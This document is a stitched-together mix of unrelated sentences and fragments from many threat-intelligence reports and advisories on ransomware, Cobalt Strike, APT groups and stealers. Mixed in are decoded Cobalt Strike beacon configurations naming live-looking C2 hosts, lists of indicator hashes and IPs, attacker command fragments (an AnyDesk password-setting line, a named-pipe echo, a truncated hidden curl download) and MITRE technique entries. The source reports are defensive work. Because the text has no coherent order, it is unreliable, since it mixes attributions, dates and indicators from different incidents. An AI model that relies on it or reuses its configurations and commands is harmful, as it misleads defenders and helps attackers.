The ransomware encrypts the victim's files using the ChaCha20 encryption algorithm and generates the encryption keys using a combination of Curve25519, an example of elliptic curve cryptography, and AES-128. 
S1124 SocGholish
Figure 44.
Custom-written malware can often be detected by some layer of protection, such as EPP and EDR tools, so it is often advantageous to utilize a legitimate tool, even if it takes some creativity to deliver the remote software client. 
In one PowerPoint sample, we observed that the actor took advantage of a Japanese venture capital company.
The malware also checks that the operating system version is within a lower and upper boundary and that the SHA1 hash of the decrypted data matches the payload header value at offset 20. 
.m 
What did we do? 
[T1189] and exploitation of public-facing applications [T1190] Access to valid
EXCEPTION TYPES & IMPLEMENTATION 
There, the user will be encouraged to download a malicious installer that embeds the Crypter with the payload. 
The C&C server is hardcoded, in cleartext, in the sample; in this specific case, it is set to 114.118.83[.]141. 
A scheduled task was then created using this same DLL. 
The domains, including pivoted domains, imitate venture capital names or big bank names.
G!dha. 
The attack starts when the victim receives an email or a text message that uses a common social engineering technique, creating a false sense of urgency to get the victim’s attention. 
Secure accounts. 
In all the samples that we have seen, the code for the dropper was hiding in non-malicious code, probably copied from other apps.
FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. Mitigations CISA and FBI recommend implementing the mitigations below and in Table 1 to improve your organization's cybersecurity posture on the basis of threat actor behaviors. 
Public Algorithm: rsaEncryption The following Cobalt Strike configuration was observed: { "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "pipename": null, "dns_beacon": { "put_metadata": null, "get_TXT": null, "get_AAAA": null, "get_A": null, "beacon": null, "maxdns": null, "dns_sleep": null, "put_output": null, "dns_idle": null }, "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "post_ex": { "spawnto_x64": "%windir%\\sysnative\\rundll32.exe", "spawnto_x86": "%windir%\\syswow64\\rundll32.exe" }, "stage": { "cleanup": "false" }, "process_inject": { "stub": "IiuPJ9vfuo3dVZ7son6mSA==", "transform_x64": [], "transform_x86": [], "startrwx": "true", "min_alloc": "0", "userwx": "true", "execute": [ "CreateThread", "SetThreadContext", "CreateRemoteThread", "RtlCreateUserThread" ], "allocator": "VirtualAllocEx" }, "uses_cookies": "true", "http_post_chunk": "0", "ssh": { "privatekey": null, "username": null, "password": null, "port": null, "hostname": null }, "useragent_header": null, "maxgetsize": "1048576", "proxy": { "behavior": "Use IE settings", "password": null, "username": null, "type": null }, "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "server": { "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnCZHWnYFqYB/6gJdkc4MPDTtBJ20nkEAd3tsY4tPKs8MV4yIjJb5CtlrbKHjzP1oD/1AQsj6EKlEMFIKtakLx5+VybrMYE+dDdkDteHmVX0AeFyw001FyQVlt1B+OSNPRscKI5sh1L/ZdwnrMy6S6nNbQ5N5hls6k2kgNO5nQ7QIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==", "port": "443", "hostname": "193.201.9.199" }, "beacontype": [ "HTTPS" ], "kill_date": null, "license_id": "1580103824", "jitter": "0", "sleeptime": "60000", "http_get": { "server": { "output": [ "print" ] }, "client": { "metadata": [], "headers": [] }, "verb": "GET", "uri": "/__utm.gif" }, "cfg_caution": "false", "host_header": "", "crypto_scheme": "0", "http_post": { "client": { "output": [], "id": [], "headers": [] }, "verb": "POST", "uri": "/submit.php" } } Checking the certificate used, reveals that it is a default SSL certificate for Cobalt Strike, 83cd09b0f73c909bfc14883163a649e1d207df22. Atera & SplashTop Even though the threat actor installed these agents, we did not observe any activity with these tools. 
Trace data of the normal Windows process, mstsc.exe Figure 4 displays the trace data of mstsc.exe being executed after being injected with malware.
So, as shown below, we will ask x32dbg to run to user mode.
Key Findings: ITG10 likely targeting South Korean government, universities, think tanks, and dissidents Phishing emails spoof legitimate senders to deliver RokRAT via LNK files Email attachments mimic legitimate documents Additional malware samples possibly related to ITG10 RokRAT campaigns Decoy Documents In late April 2023, X-Force uncovered several Zip Archives files hosting multiple lure documents likely sent via phishing campaigns operated by ITG10. X-Force assesses that the documents are likely decoys geared toward various personnel within two subsets of activity: South Korean government, communication, and educational centers; and energy, manufacturing, and supply chain.
All of them are hidden, obfuscated, and not accessible without reverse-engineering the ransomware.
The group initially deployed a wiper, Apostle, disguised as ransomware, but later modified Apostle into fully fledged ransomware.
It is unclear whether the malicious update for macOS was distributed prior to that date. 
Dropped Files 
Assigns a variable that checks if the system is 64-bit and if the 32-bit PowerShell exists in the syswow64 folder. 
TA0004 Privilege Escalation;T1078 Valid Accounts;To escalate privileges, BlackCat may use stolen legitimate accounts specified in the configuration data. ;T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control;To bypass UAC, BlackCat ransomware may escalate privileges using the ICMLuaUtil COM interface, as well as use the Masquerade PEB method. ;T1134.002 Access Token Manipulation: Create Process with Token;To escalate privileges, the BlackCat ransomware can launch its process using stolen authentication data and the function CreateProcessWithLogonW. TA0005 Defense Evasion;T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control;The attackers may bypass UAC using the ICMLuaUtil COM interface, as well as use the Masquerade PEB method. ;T1140 Deobfuscate/Decode Files or Information;BlackCat decrypts configuration data as well as decrypts and unpacks the legitimate PsExec utility and an additional BAT file contained in the body of the ransomware. ;T1027 Obfuscated Files or Information;BlackCat ransomware uses obfuscation. 
Cybercriminals have taken notice of this dependence and now regularly update their known tools and routines to include network-attached storage (NAS) devices to their list of targets, knowing full well that users rely on these devices for storing and backing up files in both modern homes and businesses.
Symmetric CryptographyModPipe encrypts communication with C&C using AES in CBC mode. 
However, in the malicious plugin the contents of the file is completely different.
From there, the threat actor added a credential to this Service Principal so that they could access the Service Principal directly, without use of an O365 user account. 
If the path exists, the next function of this malware is to check for the user config to steal the credentials.
LLMNR/NBT-NS Poisoning and SMB Relay
[D3-PA] Tactics: Command and Control
{default} safebootLastly, the malicious actor also manually executed the payload a few times on systems that had not been put into safeboot minimal and rebooted.
When 3CXDesktopApp starts, it sideloads the compromised ffmpeg.dll, which in turn decodes the embedded shellcode from d3dcompiler_47.dll and loads it.
After each spam campaign, the actor deleted the malicious inbound connector and transport rules to prevent detection, while the application remained deployed in the tenant until the next wave of the attack (in some cases, the app was dormant for months before it was reused by the threat actor). 
% codesign -dvv
For example, mid-stage infections showed calls to "146[.]70[.]86[.]44"[gerhiles[.]com].
Name cnt.ex Size 70656 bytes File-Type EXE SHA 256 26dfa8512e892dc8397c4ccbbe10efbcf85029bc2ad7b6b6fe17d26f946a01bb Compile time 2 May 2020 Figure 6.
T1588.005Obtain Capabilities: ExploitsTA410 had exploits for ProxyLogon and ProxyShell. 
It also creates a file full of garbage text that is not referenced again once created. 
On April 3rd, Kaspersky, through its telemetry, showed a direct relationship between the 3CX supply-chain victims and the deployment of a backdoor dubbed Gopuram, both involving payloads with a common name, guard64.dll.
1
SFTP Support: It includes a built-in SFTP (SSH File Transfer Protocol) implementation, enabling you to securely transfer files between the local and remote systems over the SSH connection. 
A closer look at the reflective loading technique that TargetCompany threat actors incorporated; the IP address it connects to changes every 24 hours and deploys different payloads The payload would then be decrypted through XOR or inversion and executed in memory.
To achieve this, the group distributes emails that lure targeted individuals to log in on the malicious website nknews[.]pro, which masquerades as the authentic NK News site.
LockBit 2.0 operators allegedly almost always offered discounts to their victims since the goal was to streamline attacks. 
Together, these nations represent a diverse range of economies, constituting a significant share of global GDP and population.
We’ve seen banking malware (i.e. Emotet) turn into loaders for ransomware where different threat actors can specialize in what they do best.
Note that the attackers maintained the infrastructure from at least March 2020, with some servers seemingly still active at the end of 2021 .
title: SOC Team Essentials | How to Investigate and Track the 8220 Gang Cloud Threat url: https://www.sentinelone.com/blog/soc-team-essentials-how-to-investigate-and-track-the-8220-gang-cloud-threat/ 8220 Gang is a low-skill crimeware actor known for infecting cloud hosts through n-day vulnerabilities and remote access brute forcing.
Regularly patch and update applications, software, and operating systems to address any exploitable software vulnerabilities.
This shellcode duplicates the exe process handle and transfers it to explorer.exe. 
In this case, the Qakbot Zip and ISO image were retrieved by the victim using a link included in an email.
This shows that Cobalt Strike, although it was originally created as a legitimate tool, continues to be something defenders need to monitor, as attackers are using it to set up attacks. 
Below is a more generic rule created by @bareiss_patrick which is a good example of detecting suspicious DNS traffic based on a high amount of queries for a single domain. 
The analysis host ran the Linux distro "REMnux."
and the ransomware will write numerous instances of readme.txt, which contains the following ransom note: Figure 4.
Learn more about the Cyber Threat Alliance. 
The use of IronPython for malicious purposes isn’t new, but the way Turla uses it is new.
We found two other samples from this stealer: One compilation date indicated an executable built in November 2020, and the other one in December 2021, although those dates could be tampered with.
Windows Event Log entry showing connection to O365 tenants O365 Company Service Principal Manipulation 
ExecutionTimeLimit = “PT0S”;$folder.
When looking at leak site data across all ransomware families, we’ve observed LockBit 2.0 targeting the highest number of organizations in the following regions: JAPAC, EMEA, and LATAM. 
During the installation of the software, the following command was observed: "C:\Program Files\TacticalAgent\tacticalrmm.exe"
The use of DCSync is documented in a previous TheDFIRReport titled ‘Cobalt Strike, a Defender’s Guide During AD enumeration, the operator made use of the PowerShell Get-help cmdlet to troubleshoot the following: powershell.exe Get-Help Export-CSV powershell.exe
Our threat intelligence analysts observed clear overlap between the various cases that NCC Group and Fox-IT worked in the threat’s infrastructure and capabilities, and as a result we assess with moderate confidence one activity group was carrying out the intrusions across the different type of victims. 
In this blog we explore the various methods used to distribute SYS01 stealer. 
Until 2023, this subgroup had been slow to adopt exploits for recently-disclosed vulnerabilities with publicly reported POCs, often taking several weeks to successfully weaponize exploits for vulnerabilities like Proxyshell and Log4Shell.
On top of those, it also uses a few tricks of its own: Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW. Base64-encoded strings are used for function imports (via GetProcAddress) and only decoded as needed. 
One of the most useful roles recorded by UAL is the File Server role, which includes SMB access, though other role types can also be very helpful.
It had two shortcuts: Curriculum Vitae_WANG LEI_Hong Kong Polytechnic University.pdf.lnk International English Language Testing System certificate.pdf.lnk Their structure fully matched that of the samples from May 12.
Create scheduled tasks to execute the loader and updater components. 
Chinese state-sponsored cyber actors have also been observed: Using short-term VPS devices to scan and exploit vulnerable Microsoft Exchange:registered: Outlook Web Access (OWA:registered:) and plant webshells. 
We observed different console values within the same network, identical console values using different C2 addresses, and identical console values targeting different countries.
Dropper samples 9F8530627A8AD38F47102F626DEC9F0173B44CD5 FEE9C08B494C80DBF73A6F70FACD20ED0429330D Loader samples 0D1A4CB620576B8ADD34F919B4C6C46E7C3F9A59 B47E05D67DC055AF5B0689782D67EAA2EB8C75E3 F213B4EEF63F06EC127D3DC3265E14EE190B71E5 B2CE307DFE65C188FDAE169ABD65B75B112522C4 2AC7A2C09E50EAFABF1F401194AC487ED96C6781 0F4355A17AABD3645788341EAC2A9BB759DB95EE 
This structure contains two domains and various URIs that could potentially be used to get a separate version of the bot. Figure 24: Decryption of “Lite Loader”" domains. 
Threat Detail 
The use of RDP was extensively used throughout the intrusion, using a variety of processes (beacon injected or standalone). 
We believe this was to monitor the execution of the ransomware payload. 
The purpose of this class, which initiates its execution with a method named Start (likely at an early stage when the DLL is loaded), is to initialize various other components and schedule the execution of several tasks.
That is why malware hidden inside the Python compiled byte code could slip under the radar of the traditional security solutions. 
Persistence using UEFI Rootkits and Implants – UEFI rootkits and implants are some of the stealthiest and most powerful forms of malware in existence.
Win32.HYPERBRO.ENC) signed with a stolen Cheetah certificate.
The private version of this report is available on request.
According to the documentation, to achieve this the attackers would have to reverse engineer the generation process of the “site-specific passphrase”, which is used to derive the encryption key for sensitive data.
Cobalt Strike built-in PsExec Threat actors used the built-in Cobalt Strike jump psexec command to move laterally.
The left is the algorithm revealed by Fortinet in 2017.
Disable or remove unnecessary services. 
The DLL file’s original name is “Downloader.dll.”
Figure 23.
S0595 ThiefQuest
6a9a4da3f7b2075984f79f67e4eb2f28 139.59.81.253 Kazakhstan helen a19370b97fe64ca6a0c202524af35a30 159.89.168.83 Iran helen 3c1981991cce3b329902288bb2354728 103.59.144.183 Unknown iceland 26d079e3afb08af0ac4c6d92fd221e71 178.79.177.69 UAE iceland 19c46d01685c463f21ef200e81cb1cf1 138.68.154.133 UAE iceland 28ce8dbdd2b7dfd123cebbfff263882c 138.68.154.133 Unknown iceland a78c53351e23d3f84267e67bbca6cf07 206.189.123.156 Israel (Gov),
Once authorization is completed on the TOR site, the page shown in Figure 5 appears.
The PE header is shown in Figure 3. 
Once the Looper is running, it can then call other vfgadgets that are responsible for executing specific operations, like Argument LoadersInvokers and Collectors.
Create or Modify System Process:
Data from Information Repositories: The threat actor accessed data from Information Repositories Persistence T1098.001:
and we can extract information such as executed system calls and modified memory regions. 
Lure document content This PowerPoint exploits a code execution technique that is triggered by using Hyperlinks instead of Run Program / Macro, which is designed to be triggered when the user starts the presentation mode and moves the mouse.
Align your security technologies against the technique. 
It can contain a full file path (although we did not detect any such samples) or a relative path. 
TRU is a world-class team of threat researchers who develop new detections enriched by original threat intelligence and leverage new machine learning models that correlate multi-signal data and automate rapid response to advanced threats. 
The beacon creates the named pipe (seen in Sysmon EventID 17) and impersonates the NT AUTHORITY\SYSTEM account used to connect to the pipe. 
Once it meets defined criteria, a DEV group is converted to a named actor. 
Hunting information Determining impact with Sophos XDR 1.
The following strings are contained in its encrypted configuration: 6/30/2020 1:25:52 PM ccc %ProgramData%\ msdn.exe log.dll log.dll.dat WMNetworkSvc WMNetworkSvc WMNetworkSvc SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
Agent.
Next, it parses the PE headers of the payload to extract the image size and the entry point according to the current executable’s base address.
Webcam Capture Remote Command Line Clear Logins Remote Chat File Manager Remote Input Microphone Capture SOCKS Proxy Keylogger Login Cleaner Screen Logger Local Utilities Browser History Registry Editor Password Recovery Visibility mode RedLine Stealer Analyzed File – rehoboams.exe MD5 – 6d3e8a2802848d259a3baaaa78701b97 
Since the beginning of what the industry calls “8220 Gang” the primary method of attribution has been reused infrastructure and identification of newly associated infrastructure.
Establish, and backup offline, a “known good” version of the relevant server and a regular change management policy to enable monitoring for changes to servable content with a file integrity system. 
Application COM object and assigns it to the $exec variable.
The actor likely changed the configuration to test their infrastructure and the domain fronting functionality before launching the attack.
The malware described in the article is attributed to the Winnti malware family.
Step 4 – The attacker continues to deceive the victim, in an attempt to add more credibility to the phish, by asking a series of questions to the victim, such as how, where, and when the victim would like to receive the package. 
VFS entry #2 … The last VFS entry has the ID equal to 0xFFFFFFFF and zero size.
[], "headers": [] }, "verb": "GET", "uri": "/jquery-3.3.1.min.js" }, "cfg_caution": false, "host_header": "", "crypto_scheme": "0", "http_post": { "client": { "output": [], "id": [], "headers": [] }, "verb": "POST", "uri": "/jquery-3.3.2.min.js" } } 139.60.160.18:443 (juanjik[.]com) { "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "dns_beacon": {}, "smb_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "post_ex": { "spawnto_x64": "%windir%\\sysnative\\dllhost.exe", "spawnto_x86": "%windir%\\syswow64\\dllhost.exe" }, "stage": { "cleanup": true }, "process_inject": { "stub": "yl5rgAigihmtjA5iEHURzg==", "transform_x64": [ "prepend '\\x90\\x90'" ], "transform_x86": [ "prepend '\\x90\\x90'" ], "startrwx": false, "min_alloc": "17500", "userwx": false, "execute": [ "CreateThread 'ntdll!RtlUserThreadStart'", "CreateThread", "NtQueueApcThread-s", "CreateRemoteThread", "RtlCreateUserThread" ], "allocator": "NtMapViewOfSection" }, "uses_cookies": true, "http_post_chunk": "0", "ssh": {}, "maxgetsize": "1403644", "proxy": { "behavior": "Use IE settings" }, "tcp_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "server": { "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCbFjn9w4cE3slYf3jYqTw3S+6HxAGZd3cMpTqKnDsmGAmCsll4R4jp5yz2SnrpRz8brvoZNotuWhqu71R0FqaAkaaheF5MrOHJBbCvGKDu4m6RZ0DHicJCpj6YIm0FLHNNZugHhV5Ou9lZaseCTECMnk0rXiwTsiRWv9ikRccwHwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==", "port": "80", "hostname": "juanjik[.]com" }, "beacontype": [ "HTTP" ], "license_id": "206546002", "jitter": "37", "sleeptime": "45000", "http_get": { "server": { "output": [ "print", "append 1522 characters", "prepend 84 characters", "prepend 3931 characters", "base64url", "mask" ] }, "client": { "metadata":
The shellcode we analyzed used the key 0x7B. Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded module’s startModule export. 
Ensure a system is in place to record all helpdesk queries.
Figure 42.
Mandiant has since identified POSHSPY in several other environments compromised by APT29 over the past two years. 
S0375 Remexi
Figure 1.4 3ujwy2rz7v.exe activity The executable then connected to the C2 domain name ‘dremmfyttrred[.]com’. 
The registry value VirtualStop (the registry values can be different based on the wordlist table hardcoded in the binary).
Agrius operators deployed MiniDump and SecretsDump to this campaign’s first victim on February 20th, 2022, but waited until March 12th, 2022 to deploy Host2IP, Fantasy, and Sandals (consecutively). 
To minimize the probable impact of a threat actor using Mimikatz, always limit administrative privileges to only users who actually need it; upgrade Windows to at least version 8.1 or 10; run Local Security Authority Subsystem Service (LSASS) in protected mode on Windows 8.1 and higher; harden the local security authority (LSA) to prevent code injection. 
Learn what it means to have an elite team of Threat Hunters and Researchers that works for you. 
First seen2023-02-01 23:47:05 MD5AAC5A52B939F3FE792726A13FF7A1747 SHA-1F6760FB1F8B019AF2304EA6410001B63A1809F1D SHA-256CC307CFB401D1AE616445E78B610AB72E1C7FB49B298EA003DD26EA80372089A Filenamesysnetd DescriptionBADCALL for Linux. 
If discovered, additional recovery and investigation will be required. 
This activity was identified via a NewScriptWritten event within Falcon when a JavaScript file was written to disk by a threat actor-initiated Chrome process.
The percentages shown are the amount of code that is similar between two variants. 
JollyFrog mostly aligns with what was described by Fortinet as APT10. Korplug Korplug, also known as PlugX, is a backdoor that has been used for years by many different cyberespionage groups.
%%i in (workers.txt) do for /f "tokens=2 delims=[]"
It is worth noting that since its inception, the SixLittleMonkeys group has been using Microcin against various targets, partly against high-profile entities based in Russia and Central Asia. 
DNS is a fundamental component of the internet infrastructure, as any communication must start with a DNS name resolution.
In Windows, Chrome cookies and saved passwords are encrypted using DPAPI.
server_config: This section contains information about the C&C servers and identification information about the victim and backdoor. 
In addition to the hardcoded configuration, the ransomware comes with multiple built-in options, probably for the operators comfort.
Unlike less sophisticated IoT malware, this allows the malware to avoid trying to test a full list of credentials.
"cmd" /c cd /d C:\MS_DATA\&ipconfig
T1254 Conduct Active Scanning CISA analysts reviewed the network activity of known threat actor IP addresses and found evidence of reconnaissance activity involving virtual security devices. 
FileName Path RedirSuiteServiceProxy.aspx C:\ProgramFiles\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth Xml.ashx C:\inetpub\wwwroot\aspnet_client pxh4HG1v.ashx C:\ProgramFiles\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth During the incident response process at another customer, GTSC noted that the attack team used another webshell template Filename: errorEE.aspx SHA256: be07bd9310d7a487ca2f49bcdaafb9513c0c8f99921fdf79a05eaba25b52d257 Ref: https://github.com/antonioCoco/SharPyShell Command Execution Besides collecting information on the system, the attacker downloads files, and checks connections through certutil, which is a legitimate tool available in the Windows environment. 
However, we currently have insufficient evidence to determine if there is a relationship between UNC4857 and FIN11.
The same activity group? 
Given the importance that think tanks can have in shaping U.S. policy, CISA and FBI urge individuals and organizations in the international affairs and national security sectors to immediately adopt a heightened state of awareness and implement the critical steps listed in the Mitigations section of this Advisory. 
Figure 1.
The config is decrypted using XOR and a 16-byte key which is stored immediately before the encrypted config block.
EclecticIQ analysts mapped identified TTPs to each phase of the life cycle (Figure 2) - beginning with the threat actor´s infrastructure (156[.]251[.]172[.]194) and continuing with the different tools used by the actor to compromise systems and perform lateral movement. 
This payload call sequence (in which a legitimate application loads a malicious library, which in turn decrypts a third component and passes control to it) is very commonly used to run the PlugX backdoor, which is widely seen among such Asian APT groups as APT10, APT41, TA459, and Bronze Union. 
Interestingly also, the malware invokes a function named get_password to read from stdin …it checks against the value of test 000000010000a618 bl imp___stubs__strcmp (lldb)
Ineffective separation of privileged accounts.
149.56.131.28 159.89.202.34 165.22.211.113 165.227.166.238 178.128.82.218 209.126.98.206 213.32.75.32 37.187.115.122 45.226.53.34 45.55.134.126 46.55.222.11 51.210.176.76 51.254.140.238 54.37.70.105 82.223.82.69 91.207.181.106 92.114.18.20 94.23.45.86 96.125.171.16 Cobalt Strike The following Cobalt Strike C2 servers were observed being used.
Usually, the password contains the password needed to open the supplied encrypted decoy document. 
For the most part, the malware is posed as a software activator, patcher, or keygen, among other similar software executables.
Three-layer infection chain delivers and detonates the payloadsMalicious batch file downloads the PowerShell downloaderThe RAR file containing a malicious batch file with a .cmd extension is downloaded to the user’s machine.
The Alien Labs team will continue to monitor the threat landscape for SeroXen samples and infrastructure. 
| C:\ProgramData\anydesk.exe --set-password 
Its likely that this discovery technique forms an extension of T1033 – System Owner/User Discovery, where the threat actor was leveraging this data source to understand the account pattern of life, any indicators from compromise, and to potentially blend in adversary activities. 
Among its many legitimate uses, Unit 42 researchers have most often observed Mimikatz being leveraged maliciously by threat actors in the following ways: Credential Loading Mimikatz loads credentials from various sources such as Windows memory, Local Security Authority Subsystem Service (LSASS) process and the Windows registry. 
"Domain Admins" C:\Windows\system32\cmd.exe /C
NetSupport RAT has been observed in numerous attacks on enterprise environments over the years, and Pokemon is just the latest in a long line of creative lures used to distribute and drop NetSupport RAT.
Next-Generation Firewalls:
Dynamic API ResolutionThe loaders use dynamic API resolution to avoid detection. 
t Is the theme used as a decoy Side loaded malicious DLL 
The group's victimology is extensive, targeting organizations across various sectors globally.
The activity took place six days a week, rarely on Sundays.
Port 4543 is the default listening port for XMRig’s API.
Moreover, the variant is rather buggy …containing flaws such as buffer overflows that will cause it to prematurely exit, when run on macOS: The likely explanation to all this, is that the specimen we looked at today is test (or beta): “Cisco Talos researcher Azim Khodjibaev told BleepingComputer that based on their research, the encryptors were meant as a test and were never intended for deployment in live cyberattacks.” 
[D3-RPA] Isolate: Network Isolation Outbound Traffic Filtering [D3-OTF] Appendix B: MITRE ATT&CK Framework Figure 2: MITRE ATT&CK Enterprise tactics and techniques used by Chinese state-sponsored cyber actors (Click here for the downloadable JSON file.) 
GetEncoding(936).GetString(System.
For the execution, the injector process dispatches another APC using NtQueueApcThread to force the remote process to execute NtSetContextThread.
This is a classic and clever living-off-the-land binary (LoLBin) tactic that avoids popular credential extraction tools like Mimikatz, which may alert defenders.
We also couldn’t verify how the IronPython scripts get run in the first place.
echo xgxfpw > \\.\pipe\xgxfpw cmd.exe /c
Widespread implementation of robust configuration and patch management programs would greatly increase network security.
This technique has been used by ransomware actors as well such as by both Maze and Ragnar Locker. 
KRBTGT never changed Change the krbtgt account password on a regular schedule such as every 6 to 12 months or if it becomes compromised.
<
Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.
S1040 Rclone
This would cause the Bitcoin network to crash whilst it attempted to validate the duplicate transaction.
Underground Advertising In March 2020, the moniker Bugatti began actively advertising the NetWalker Ransomware-as-a-Service on two popular underground fora.
This is a critical strength because it slowed the team from moving around the network in the initial parts of the Phase I. 
Embedded .NET injector and payload(s) are encoded with Base64 and encrypted with Rijndael. 
The script renames the downloaded file with a random name and deflates its contents.
However, this backdoor has an anti-debugging technique, which will check if the running processes have the strings dbg.exe or olly. Figure 27.
T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Cloud storage and transfer services such as Mega.nz, Anonfiles.com, File.io, and Sendspace have been used by Vice Society to exfiltrate victim data. 
[T1140], Disable or Modify System Firewall
CONTROL_USER_SHELLEXEC 
This command uses the Microsoft Directory Replication Service (MS-DRSR) protocol and specifically the IDL_DRSGetNCChanges method to return account information from Active Directory such as the current NTLM password hashes and previous password hashes used for enforcing password reuse restrictions.
Hidden -command curl -o %
Prevent exploitation of known software vulnerabilities by routinely applying software patches and upgrades.
In September 2020, a series of agreements called the Abraham Accords were signed between Israel, United Arab Emirates, and Bahrain.
[S0363] PowerSploit
During the investigation, we found that Gopuram coexisted on victim machines with AppleJeus, a backdoor attributed to the Korean-speaking threat actor Lazarus. 
Figure 9: Contents of update.bat The requestadmin.bat is responsible for performing antivirus tampering – adding %APPDATA% and %USERPROFILE%\ paths to Windows Defender exclusion to prevent Defender from scanning the mentioned paths.
This allowed the threat actor to send emails that looked like they originated from the compromised Exchange domain.
The response gets decrypted with the IcedID decryption routine, then split into the encrypted bot (being “license.dat”) and the custom DLL loader which is generally some randomly generated filename ending in .tmp. 
This Cobalt Strike server stopped communicating shortly there after. 
Services: Service ExecutionTechniqueT1569.002https://attack.mitre.org/techniques/T1569/002/Windows Management InstrumentationTechniqueT1047https://attack.mitre.org/techniques/T1047/PersistenceTacticTA0003https://attack.mitre.org/tactics/TA0003/External Remote ServicesTechniqueT1133https://attack.mitre.org/techniques/T1133/Hijack Execution Flow: DLL Side-LoadingTechniqueT1574.002https://attack.mitre.org/techniques/T1574/002/Valid AccountsTechniqueT1078https://attack.mitre.org/techniques/T1078/Privilege EscalationTacticTA0004https://attack.mitre.org/tactics/TA0004/Valid AccountsTechniqueT1078https://attack.mitre.org/techniques/T1078/Defense EvasionTacticTA0005https://attack.mitre.org/tactics/TA0005/Deobfuscate/Decode
S0271 KEYMARBLE
See the CISA-FBI Joint Cybersecurity Advisory on Defending Against Malicious Cyber Activity Originating from Tor for mitigation options and additional information. 
[T1049] on SCCM Server 1, which revealed an active Server Message Block (SMB) connection from SCCM Server 2. Attempted to move laterally to the SCCM Server 2 via AppDomain hijacking, but the HTTPS beacon failed to call back. 
Another C&C server, 103.169.90[.]132, is known to be used by the threat actors continuously. 
Our All Intel service includes long term infrastructure tracking, clustering, C2 configs, and other curated intel, including non-public case data. 
IoCs Files SHA-1FilenameESET detection nameDescription 0CA1723AFE261CD85B05C9EF424FC50290DCE7DFguiconfigdLinux/NukeSped.
The unique idea behind AtomBombing is the write-primitive, which allows writing to the remote process using atom tables and APC. 
Similar credential stealing techniques can also be used with other operating systems as well. 
ScarCruft seems to be interested mainly in government and military organizations, and companies in various industries linked to the interests of North Korea. 
Prioritize patching VPN servers, remote access software, virtual machine software, and known exploited vulnerabilities.
The Phant0m tool provides a complete implementation of this process. 
It appears that WatchDog actors are attempting to expand their cryptojacking operations, while simultaneously masking their operations with those of the known cryptojacking operations performed by TeamTNT.
The sample was uploaded on VirusTotal some months ago and had 0 detections, as shown in Figure 17. Figure 17.
CrowdStrike Uncovers I2Pminer MacOS Mineware Variant
Hard-coded credentials for brute forcing.
In these cases there is no attachment: a link to the GetResponse platform leads to the download of malware. 
We will also discuss an approach that can be used to effectively detect these techniques inside the network. 
More information on the Lite Loader and Emotet can be found in our previous report here.
If the deployment of a solution within the critical zones of the network can detect the use of stolen credentials before adversaries can reach their target, the critical assets could still be prevented from being compromised. 
Multiple users on underground forums have since come forward claiming to be unpaid DARKSIDE affiliates, and in some cases privately provided evidence to forum administrators who confirmed that their claims were legitimate.
Recent operations From late 2021 to mid-2022, this Mint Sandstorm subgroup moved from reconnaissance to direct targeting of US critical infrastructure including seaports, energy companies, transit systems, and a major US utility and gas entity potentially in support of retaliatory destructive cyberattacks.
Frequently, these have been referred to by their extension (e.g., .DREAM, .Nutella, .NARCO, .LEGO).
TA0004 Privilege Escalation T1484.001.
Verify successful implementation of mitigations by executing the vendor supplied script without parameters to ensure that no vulnerabilities remain.
This repository has been in use since December 8, 2022; after news of the compromise spread widely on March 29, the repository was taken down. 
Date time checking Anti-Sandbox Anti-VM Anti-Scanner FTP server setting Steal data Upload Stolen data Clear log It first checks whether the system’s date is between 2022-11-09 and 2023-04-12.
.TXT.
T1497Virtualization/Sandbox EvasionSome versions of FlowCloud use the Pafish utility to detect virtualization, sandboxes, and debuggers. 
Attacker-created Service Principal First, the threat actor used a compromised O365 administrator account to create a new Service Principal with a generic name.
HTTP C2 Communication LokiBot exfiltrates information to the C2 through the HTTP protocol.
[T1218.010], File Deletion
